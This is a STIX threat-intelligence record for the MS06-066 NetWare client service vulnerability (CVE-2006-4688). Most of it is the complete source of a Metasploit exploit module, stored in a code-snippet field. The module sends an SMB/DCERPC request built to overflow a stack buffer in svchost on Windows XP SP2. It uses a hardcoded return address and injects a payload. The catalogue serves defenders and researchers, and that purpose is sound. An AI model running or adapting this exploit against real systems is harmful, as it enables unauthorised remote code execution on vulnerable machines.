{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f5e2ad8b-2905-45cf-b0ee-930ca030a8bb",
    "created": "2024-08-14T16:56:31.75264Z",
    "modified": "2024-08-14T16:56:31.752645Z",
    "name": "MS06-066 Microsoft Services nwwks.dll Module Exploit",
    "description": " This module exploits a stack buffer overflow in the svchost service, when the netware client service is running. This specific vulnerability is in the nwapi32.dll module. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/ms06_066_nwwks.rb",
            "external_id": "ms06_066_nwwks.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-4688"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS06-066 Microsoft Services nwwks.dll Module Exploit',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the svchost service, when the netware\n        client service is running. This specific vulnerability is in the nwapi32.dll module.\n      },\n      'Author'         => [ 'pusscat' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-4688'],\n          [ 'OSVDB', '30260'],\n          [ 'BID', '21023'],\n          [ 'MSB', 'MS06-066'],\n\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\",\n          'Compat'   =>\n          {\n            # -ws2ord XXX?\n          },\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Windows XP SP2',\n            {\n              'Ret'      => 0x616566fb, # modemui.dll   [esp + 16]: popaw, ret\n            },\n          ]\n        ],\n\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2006-11-14'))\n\n    register_options(\n      [\n        OptString.new('SMBPIPE', [ true,  \"The pipe name to use (browser, srvsvc, wkssvc, ntsvcs)\", 'nwwks']),\n      ])\n\n  end\n\n  def exploit\n    # [in] [unique] wchar *\n    # [in] [unique] wchar *\n    # [out] long\n\n    ofstring    = Rex::Text.to_unicode('\\\\\\\\') + rand_text(292) + [ target.ret ].pack('V') + \"\\x00\\x00\"\n    stubdata =\n      NDR.long(rand(0xffffffff)) +\n        NDR.UnicodeConformantVaryingString(rand_text(rand(128)) + \"\\x00\") +\n      NDR.long(rand(0xffffffff)) +\n        NDR.UnicodeConformantVaryingStringPreBuilt(payload.encoded + \"\\x00\\x00\") +\n      NDR.long(rand(0xffffffff)) +\n        NDR.UnicodeConformantVaryingString(rand_text(rand(128)) + \"\\x00\") +\n      NDR.long(rand(0xffffffff)) +\n        NDR.UnicodeConformantVaryingString(rand_text(rand(128)) + \"\\x00\") +\n        NDR.UnicodeConformantVaryingStringPreBuilt(ofstring)\n\n    print_status(\"Connecting to the SMB service...\")\n    connect()\n    smb_login()\n\n    handle = dcerpc_handle('e67ab081-9844-3521-9d32-834f038001c0', '1.0', 'ncacn_np', [\"\\\\#{datastore['SMBPIPE']}\"])\n    print_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    print_status(\"Calling the vulnerable function...\")\n\n    begin\n      dcerpc.call(0x01, stubdata)\n    rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n      print_status('Server did not respond, this is expected')\n    rescue => e\n      if e.to_s =~ /STATUS_PIPE_DISCONNECTED/\n        print_status('Server disconnected, this is expected')\n      else\n        raise e\n      end\n    else\n      print_status(\"Got #{dcerpc.last_response.stub_data.length} bytes: #{dcerpc.last_response.stub_data}\")\n    end\n\n    # Cleanup\n    handler\n    disconnect\n\n    if (dcerpc.last_response != nil and\n      dcerpc.last_response.stub_data != nil and\n      dcerpc.last_response.stub_data == \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1a\\x00\\x00\\x00\")\n      return true\n    else\n      return false\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-11-14",
    "x_mitre_platforms": [
        "win'"
    ]
}